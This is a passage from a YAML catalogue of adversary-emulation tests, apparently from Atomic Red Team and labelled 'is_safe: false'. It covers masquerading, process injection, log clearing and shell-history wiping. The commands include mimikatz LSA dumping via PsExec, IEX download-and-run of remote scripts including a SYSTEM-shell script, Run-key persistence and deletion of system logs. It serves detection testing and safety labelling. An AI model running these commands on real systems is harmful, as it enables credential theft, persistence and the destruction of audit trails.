        kill $(cat /tmp/evil_pid.txt) || echo "Failed to kill PID $evil_pid"
        rm /tmp/evil_pid.txt
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1036/004
  is_safe: false
- id: T1036.005
  name: Match Legitimate Resource Name or Location
  description: "Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation. \n\nThis may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containeri..."
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Execute a process from a directory masquerading as the current parent directory
      type: sh
      platform: macos
      command: |-
        mkdir $HOME/...
        cp $(which sh) $HOME/...
        $HOME/.../sh -c "echo Hello from the Atomic Red Team test T1036.005#1"
      cleanup: |-
        rm -f $HOME/.../sh
        rmdir $HOME/.../
      timeout: 60
    - name: Execute a process from a directory masquerading as the current parent directory
      type: sh
      platform: linux
      command: |-
        mkdir $HOME/...
        cp $(which sh) $HOME/...
        $HOME/.../sh -c "echo Hello from the Atomic Red Team test T1036.005#1"
      cleanup: |-
        rm -f $HOME/.../sh
        rmdir $HOME/.../
      timeout: 60
    - name: Masquerade as a built-in system executable
      type: powershell
      platform: windows
      command: |-
        Add-Type -TypeDefinition @'
        public class Test {
            public static void Main(string[] args) {
                System.Console.WriteLine("tweet, tweet");
            }
        }
        '@ -OutputAssembly "$Env:windir\Temp\svchost.exe"

        Start-Process -FilePath "$Env:windir\Temp\svchost.exe"
      cleanup: Remove-Item -Path "$Env:windir\Temp\svchost.exe" -ErrorAction Ignore
      timeout: 120
    - name: Masquerading cmd.exe as VEDetector.exe
      type: powershell
      platform: windows
      command: |-
        # Copy and rename cmd.exe to VEDetector.exe
        Copy-Item -Path "$env:SystemRoot\System32\cmd.exe" -Destination "$env:TEMP\VEDetector.exe" -Force

        # Create registry run key for persistence
        New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "VEDetector" -Value "$env:TEMP\VEDetector.exe" -PropertyType String -Force

        # Start the renamed process
        Start-Process -FilePath "$env:TEMP\VEDetector.exe"

        Start-Sleep -Seconds 5
      cleanup: |-
        # Remove registry key
        Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "VEDetector" -ErrorAction SilentlyContinue

        # Stop the process
        Stop-Process -Name "VEDetector" -Force -ErrorAction SilentlyContinue

        # Remove the file
        Remove-Item -Path "$env:TEMP\VEDetector.exe" -Force -ErrorAction SilentlyContinue

        Write-Host "[+] Cleaned up VEDetector artifacts"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1036/005
  is_safe: false
- id: T1036.006
  name: Space after Filename
  description: |-
    Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.

    For example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clic...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
  executors:
    - name: Space After Filename
      type: sh
      platform: macos
      command: |-
        mkdir -p /tmp/atomic-test-T1036.006
        cd /tmp/atomic-test-T1036.006
        mkdir -p 'testdirwithspaceend '
        [ "$(uname)" = 'FreeBSD' ] && /bin/echo "#\!/bin/sh" > "testdirwithspaceend /init " && echo 'echo "print(\"running T1035.006 with space after filename to masquerade init\")" | python3.9' >> "testdirwithspaceend /init " && echo "exit" >> "testdirwithspaceend /init " || /usr/bin/echo -e "%d\na\n#!/usr/bin/perl\nprint \"running T1035.006 with space after filename to masquerade init\\n\";\nqx/cp \/usr\/bin\/perl 'init  '/;\nqx/'.\/init  ' -e 'sleep 5'/;\n.\nwq\n" | ed 'testdirwithspaceend /init ' >/dev/null
        chmod +x 'testdirwithspaceend /init '
        './testdirwithspaceend /init '
      cleanup: rm -rf /tmp/atomic-test-T1036.006
      timeout: 60
    - name: Space After Filename
      type: sh
      platform: linux
      command: |-
        mkdir -p /tmp/atomic-test-T1036.006
        cd /tmp/atomic-test-T1036.006
        mkdir -p 'testdirwithspaceend '
        [ "$(uname)" = 'FreeBSD' ] && /bin/echo "#\!/bin/sh" > "testdirwithspaceend /init " && echo 'echo "print(\"running T1035.006 with space after filename to masquerade init\")" | python3.9' >> "testdirwithspaceend /init " && echo "exit" >> "testdirwithspaceend /init " || /usr/bin/echo -e "%d\na\n#!/usr/bin/perl\nprint \"running T1035.006 with space after filename to masquerade init\\n\";\nqx/cp \/usr\/bin\/perl 'init  '/;\nqx/'.\/init  ' -e 'sleep 5'/;\n.\nwq\n" | ed 'testdirwithspaceend /init ' >/dev/null
        chmod +x 'testdirwithspaceend /init '
        './testdirwithspaceend /init '
      cleanup: rm -rf /tmp/atomic-test-T1036.006
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1036/006
  is_safe: false
- id: T1036.007
  name: Double File Extension
  description: 'Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: expl...'
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: File Extension Masquerading
      type: cmd
      platform: windows
      command: |-
        copy "C:\Windows\System32\calc.exe" %temp%\T1036.007_masquerading.docx.exe /Y
        copy "C:\Windows\System32\calc.exe" %temp%\T1036.007_masquerading.pdf.exe /Y
        copy "C:\Windows\System32\calc.exe" %temp%\T1036.007_masquerading.ps1.exe /Y
        copy "PathToAtomicsFolder\T1036.007\src\T1036.007_masquerading.vbs" %temp%\T1036.007_masquerading.xls.vbs /Y
        copy "PathToAtomicsFolder\T1036.007\src\T1036.007_masquerading.vbs" %temp%\T1036.007_masquerading.xlsx.vbs /Y
        copy "PathToAtomicsFolder\T1036.007\src\T1036.007_masquerading.vbs" %temp%\T1036.007_masquerading.png.vbs /Y
        copy "PathToAtomicsFolder\T1036.007\src\T1036.007_masquerading.ps1" %temp%\T1036.007_masquerading.doc.ps1 /Y
        copy "PathToAtomicsFolder\T1036.007\src\T1036.007_masquerading.ps1" %temp%\T1036.007_masquerading.pdf.ps1 /Y
        copy "PathToAtomicsFolder\T1036.007\src\T1036.007_masquerading.ps1" %temp%\T1036.007_masquerading.rtf.ps1 /Y
        %temp%\T1036.007_masquerading.docx.exe
        %temp%\T1036.007_masquerading.pdf.exe
        %temp%\T1036.007_masquerading.ps1.exe
        %temp%\T1036.007_masquerading.xls.vbs
        %temp%\T1036.007_masquerading.xlsx.vbs
        %temp%\T1036.007_masquerading.png.vbs
        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1
        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1
        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1
      cleanup: |-
        del /f %temp%\T1036.007_masquerading.docx.exe > nul 2>&1
        del /f %temp%\T1036.007_masquerading.pdf.exe > nul 2>&1
        del /f %temp%\T1036.007_masquerading.ps1.exe > nul 2>&1
        del /f %temp%\T1036.007_masquerading.xls.vbs > nul 2>&1
        del /f %temp%\T1036.007_masquerading.xlsx.vbs > nul 2>&1
        del /f %temp%\T1036.007_masquerading.png.vbs > nul 2>&1
        del /f %temp%\T1036.007_masquerading.doc.ps1 > nul 2>&1
        del /f %temp%\T1036.007_masquerading.pdf.ps1 > nul 2>&1
        del /f %temp%\T1036.007_masquerading.rtf.ps1 > nul 2>&1
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1036/007
  is_safe: false
- id: T1055
  name: Process Injection
  description: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a le...
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - privilege-escalation
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Shellcode execution via VBA
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
      timeout: 120
    - name: Remote Process Injection in LSASS via mimikatz
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" /accepteula \\DC1 -c %tmp%\mimikatz\x64\mimikatz.exe "lsadump::lsa /inject /id:500" "exit"'
      timeout: 120
    - name: Section View Injection
      type: powershell
      platform: windows
      command: |-
        $notepad = Start-Process notepad -passthru
        Start-Process "$PathToAtomicsFolder\T1055\bin\x64\InjectView.exe"
      cleanup: Stop-Process $notepad.pid
      timeout: 120
    - name: Dirty Vanity process Injection
      type: powershell
      platform: windows
      command: Start-Process "$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe" (Start-Process calc.exe -PassThru).Id
      cleanup: Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force
      timeout: 120
    - name: Read-Write-Execute process Injection
      type: powershell
      platform: windows
      command: |-
        $address = (& "$PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe" "$PathToAtomicsFolder\T1055\bin\x64\vuln_dll\" | Out-String | Select-String -Pattern "VirtualAddress: (\w+)").Matches.Groups[1].Value
        & "PathToAtomicsFolder\T1055\bin\x64\RWXinjectionLocal.exe" "PathToAtomicsFolder\T1055\bin\x64\vuln_dll\msys-2.0.dll" $address
      cleanup: Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
      timeout: 120
      elevation_required: true
    - name: Process Injection with Go using UuidFromStringA WinAPI
      type: powershell
      platform: windows
      command: $PathToAtomicsFolder\T1055\bin\x64\UuidFromStringA.exe -debug
      cleanup: Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
      timeout: 120
    - name: Process Injection with Go using EtwpCreateEtwThread WinAPI
      type: powershell
      platform: windows
      command: $PathToAtomicsFolder\T1055\bin\x64\EtwpCreateEtwThread.exe -debug
      cleanup: Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
      timeout: 120
    - name: Remote Process Injection with Go using RtlCreateUserThread WinAPI
      type: powershell
      platform: windows
      command: |-
        $process = Start-Process C:\Windows\System32\werfault.exe -passthru
        $PathToAtomicsFolder\T1055\bin\x64\RtlCreateUserThread.exe -pid $process.Id -debug
      cleanup: |-
        Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
        Stop-Process -Name werfault -ErrorAction SilentlyContinue
      timeout: 120
    - name: Remote Process Injection with Go using CreateRemoteThread WinAPI
      type: powershell
      platform: windows
      command: |-
        $process = Start-Process C:\Windows\System32\werfault.exe -passthru
        $PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug
      cleanup: |-
        Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
        Stop-Process -Name werfault -ErrorAction SilentlyContinue
      timeout: 120
    - name: Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively)
      type: powershell
      platform: windows
      command: |-
        $process = Start-Process C:\Windows\System32\werfault.exe -passthru
        $PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug
      cleanup: |-
        Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
        Stop-Process -Name werfault -ErrorAction SilentlyContinue
      timeout: 120
    - name: Process Injection with Go using CreateThread WinAPI
      type: powershell
      platform: windows
      command: $PathToAtomicsFolder\T1055\bin\x64\CreateThread.exe -debug
      cleanup: Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
      timeout: 120
    - name: Process Injection with Go using CreateThread WinAPI (Natively)
      type: powershell
      platform: windows
      command: $PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe -debug
      cleanup: Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
      timeout: 120
    - name: UUID custom process Injection
      type: powershell
      platform: windows
      command: |-
        Start-Process "PathToAtomicsFolder\T1055\bin\x64\uuid_injection.exe"
        Start-Sleep -Seconds 7
        Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
      cleanup: Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1055
  is_safe: false
- id: T1055.001
  name: Dynamic-link Library Injection
  description: "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAl..."
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Process Injection via mavinject.exe
      type: powershell
      platform: windows
      command: |-
        $mypid = (Start-Process notepad -PassThru).id
        mavinject $mypid /INJECTRUNNING "PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll"
        Stop-Process -processname notepad
      timeout: 120
      elevation_required: true
    - name: WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique
      type: powershell
      platform: windows
      command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1055/001
  is_safe: false
- id: T1055.002
  name: Portable Executable Injection
  description: "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>Virtua..."
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Portable Executable Injection
      type: powershell
      platform: windows
      command: |-
        Start-Process "PathToAtomicsFolder\T1055.002\bin\RedInjection.exe"
        Start-Sleep -Seconds 7
        Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
      cleanup: Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1055/002
  is_safe: false
- id: T1055.003
  name: Thread Execution Hijacking
  description: "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first cr..."
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Thread Execution Hijacking
      type: powershell
      platform: windows
      command: |-
        $notepad = Start-Process notepad -passthru
        Start-Process "$PathToAtomicsFolder\T1055.003\bin\InjectContext.exe"
        Start-Sleep -Seconds 5
        Stop-Process $notepad.id
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1055/003
  is_safe: false
- id: T1055.004
  name: Asynchronous Procedure Call
  description: "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citati..."
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Process Injection via C#
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\T1055.004\bin\T1055.exe"'
      timeout: 120
    - name: EarlyBird APC Queue Injection in Go
      type: powershell
      platform: windows
      command: $PathToAtomicsFolder\T1055.004\bin\x64\EarlyBird.exe -program "C:\Windows\System32\werfault.exe" -debug
      cleanup: |-
        Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
        Stop-Process -Name "werfault" -ErrorAction SilentlyContinue
      timeout: 120
    - name: Remote Process Injection with Go using NtQueueApcThreadEx WinAPI
      type: powershell
      platform: windows
      command: $PathToAtomicsFolder\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
      cleanup: Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1055/004
  is_safe: false
- id: T1055.011
  name: Extra Window Memory Injection
  description: "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citati..."
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Process Injection via Extra Window Memory (EWM) x64 executable
      type: powershell
      platform: windows
      command: PathToAtomicsFolder\T1055.011\bin\T1055.011_#{arch}.exe
      cleanup: Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1055/011
  is_safe: false
- id: T1055.012
  name: Process Hollowing
  description: "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which ..."
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Process Hollowing using PowerShell
      type: powershell
      platform: windows
      command: |-
        . "PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1"
        $ppid=Get-Process explorer | select -expand id
        Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
      cleanup: Stop-Process -Name "notepad" -ErrorAction Ignore
      timeout: 120
    - name: RunPE via VBA
      type: powershell
      platform: windows
      command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"Word\" -sub \"Exploit\""
      timeout: 120
    - name: Process Hollowing in Go using CreateProcessW WinAPI
      type: powershell
      platform: windows
      command: $PathToAtomicsFolder\T1055.012\bin\x64\CreateProcess.exe -program "C:\Windows\System32\werfault.exe" -debug
      cleanup: |-
        Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
        Stop-Process -Name "werfault" -ErrorAction SilentlyContinue
      timeout: 120
    - name: Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs (T1055.012)
      type: powershell
      platform: windows
      command: $PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program "C:\Windows\System32\werfault.exe" -debug
      cleanup: |-
        Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
        Stop-Process -Name "werfault" -ErrorAction SilentlyContinue
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1055/012
  is_safe: false
- id: T1055.015
  name: ListPlanting
  description: |-
    Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process.(Citation: Hexacorn Listplanting) Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.

    List-view controls are user interface windows used to di...
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Process injection ListPlanting
      type: powershell
      platform: windows
      command: |-
        Start-Process "PathToAtomicsFolder\T1055.015\bin\ListPlanting.exe"
        Start-Sleep -Seconds 7
        Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
      cleanup: Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1055/015
  is_safe: false
- id: T1070
  name: Indicator Removal
  description: Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversarys actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as comma...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Indicator Removal using FSUtil
      type: cmd
      platform: windows
      command: 'fsutil usn deletejournal /D C:'
      cleanup: 'fsutil usn createjournal m=1000 a=100 c:'
      timeout: 120
      elevation_required: true
    - name: Indicator Manipulation using FSUtil
      type: powershell
      platform: windows
      command: "if (-not (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\")) { New-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\" -Force } \necho \"1234567890\" > \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\"\nfsutil  file setZeroData offset=0 length=10 \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\""
      cleanup: rm "PathToAtomicsFolder\..\ExternalPayloads\T1070-2.txt"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1070
  is_safe: false
- id: T1070.001
  name: Clear Windows Event Logs
  description: |-
    Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.


    With administrator privileges, the event logs can be cleared with the following utility commands:

    * <code>wevtutil cl system</code>
    * <code>wevtutil cl application</code>
    * ...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Clear Logs
      type: cmd
      platform: windows
      command: wevtutil cl System
      timeout: 120
      elevation_required: true
    - name: Delete System Logs Using Clear-EventLog
      type: powershell
      platform: windows
      command: |-
        $logs = Get-EventLog -List | ForEach-Object {$_.Log}
        $logs | ForEach-Object {Clear-EventLog -LogName $_ }
        Get-EventLog -list
      timeout: 120
      elevation_required: true
    - name: Clear Event Logs via VBA
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1070/001
  is_safe: false
- id: T1070.002
  name: Clear Linux or Mac System Logs
  description: |-
    Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)

    * <code>/var/log/messages:</code>: General and system-related messages
    * <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authenticatio...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
  executors:
    - name: rm -rf
      type: sh
      platform: macos
      command: |-
        sudo rm -rf /var/log/system.log
        if [ -d /var/audit ] ; then sudo rm -rf /var/audit/20220725213300.202208110700021 ; fi
      timeout: 60
      elevation_required: true
    - name: rm -rf
      type: sh
      platform: linux
      command: |-
        sudo rm -rf /var/log/system.log
        if [ -d /var/audit ] ; then sudo rm -rf /var/audit/20220725213300.202208110700021 ; fi
      timeout: 60
      elevation_required: true
    - name: rm -rf (2)
      type: sh
      platform: linux
      command: |-
        rm -rf /var/log/messages
        rm -rf /var/log/security
      timeout: 60
      elevation_required: true
    - name: Delete log files using built-in log utility
      type: sh
      platform: macos
      command: |-
        sudo log erase --all
        sudo log erase --ttl #Deletes only time-to-live log content
      timeout: 60
      elevation_required: true
    - name: Truncate system log files via truncate utility
      type: sh
      platform: macos
      command: 'sudo truncate -s 0 /var/log/system.log #size parameter shorthand'
      timeout: 60
      elevation_required: true
    - name: Truncate system log files via truncate utility (freebsd)
      type: sh
      platform: linux
      command: |-
        truncate -s 0 /var/log/messages #size parameter shorthand
        truncate --size=0 /var/log/security #size parameter
      timeout: 60
      elevation_required: true
    - name: Delete log files via cat utility by appending /dev/null or /dev/zero
      type: sh
      platform: macos
      command: |-
        sudo cat /dev/null > /var/log/system.log #truncating the file to zero bytes
        sudo dd if=/dev/zero bs=1000 count=5 of=/var/log/system.log #log file filled with null bytes(zeros)
      timeout: 60
      elevation_required: true
    - name: Delete log files via cat utility by appending /dev/null or /dev/zero (freebsd)
      type: sh
      platform: linux
      command: |-
        cat /dev/null > /var/log/messages #truncating the file to zero bytes
        cat /dev/zero > /var/log/messages #log file filled with null bytes(zeros)
      timeout: 60
      elevation_required: true
    - name: System log file deletion via find utility
      type: sh
      platform: macos
      command: |-
        sudo find /var/log -name 'system.log*' -exec rm {} \; #using "rm" execution
        sudo find /var/log -name "system.log.97.gz*" -exec shred -u -z -n 3 {} \; #using "shred" execution
        sudo find /var/log -name "system.log.98.gz*" -exec unlink {} \; #using "unlink" execution
      timeout: 60
      elevation_required: true
    - name: Overwrite macOS system log via echo utility
      type: sh
      platform: macos
      command: sudo echo '' > /var/log/system.log
      timeout: 60
      elevation_required: true
    - name: Overwrite FreeBSD system log via echo utility
      type: sh
      platform: linux
      command: echo '' > /var/log/messages
      timeout: 60
      elevation_required: true
    - name: Real-time system log clearance/deletion
      type: sh
      platform: macos
      command: 'sudo log -f /var/log/system.log | : > /var/log/system.log'
      timeout: 60
      elevation_required: true
    - name: Delete system log files via unlink utility
      type: sh
      platform: macos
      command: sudo unlink /var/log/system.log
      timeout: 60
      elevation_required: true
    - name: Delete system log files via unlink utility (freebsd)
      type: sh
      platform: linux
      command: unlink /var/log/messages
      timeout: 60
      elevation_required: true
    - name: Delete system log files using shred utility
      type: sh
      platform: macos
      command: sudo shred -u -z -n 3 /var/log/system.log
      timeout: 60
      elevation_required: true
    - name: Delete system log files using srm utility
      type: sh
      platform: macos
      command: |-
        sudo srm /var/log/system.log #system log file deletion
        sudo srm -r /var/log/ #recursive deletion of log files
      timeout: 60
      elevation_required: true
    - name: Delete system log files using OSAScript
      type: sh
      platform: macos
      command: osascript -e 'do shell script "rm /var/log/system.log" with administrator privileges'
      timeout: 60
      elevation_required: true
    - name: Delete system log files using Applescript
      type: sh
      platform: macos
      command: osascript -e 'tell application "Finder" to delete POSIX file "/var/log/system.log"'
      timeout: 60
      elevation_required: true
    - name: Delete system journal logs via rm and journalctl utilities
      type: sh
      platform: linux
      command: |-
        sudo rm /var/log/journal/* #physically deletes the journal files, and not just their content
        sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place
      timeout: 60
      elevation_required: true
    - name: Overwrite Linux Mail Spool
      type: bash
      platform: linux
      command: echo 0> /var/spool/mail/root
      timeout: 60
      elevation_required: true
    - name: Overwrite Linux Log
      type: bash
      platform: linux
      command: echo 0> /var/log/secure
      cleanup: if [ "/var/log/secure" != "/var/log/secure" ] ; then rm -f /var/log/secure ; fi
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1070/002
  is_safe: false
- id: T1070.003
  name: Clear Command History
  description: |-
    In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.

    On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. Whe...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Clear Bash history (rm)
      type: sh
      platform: linux
      command: rm ~/.bash_history
      timeout: 60
    - name: Clear Bash history (rm)
      type: sh
      platform: macos
      command: rm ~/.bash_history
      timeout: 60
    - name: Clear Bash history (echo)
      type: sh
      platform: linux
      command: echo "" > ~/.bash_history
      timeout: 60
    - name: Clear Bash history (cat dev/null)
      type: sh
      platform: linux
      command: cat /dev/null > ~/.bash_history
      timeout: 60
    - name: Clear Bash history (cat dev/null)
      type: sh
      platform: macos
      command: cat /dev/null > ~/.bash_history
      timeout: 60
    - name: Clear Bash history (ln dev/null)
      type: sh
      platform: linux
      command: ln -sf /dev/null ~/.bash_history
      timeout: 60
    - name: Clear Bash history (ln dev/null)
      type: sh
      platform: macos
      command: ln -sf /dev/null ~/.bash_history
      timeout: 60
    - name: Clear Bash history (truncate)
      type: sh
      platform: linux
      command: truncate -s0 ~/.bash_history
      timeout: 60
    - name: Clear history of a bunch of shells
      type: sh
      platform: linux
      command: |-
        unset HISTFILE
        export HISTFILESIZE=0
        history -c
      timeout: 60
    - name: Clear history of a bunch of shells
      type: sh
      platform: macos
      command: |-
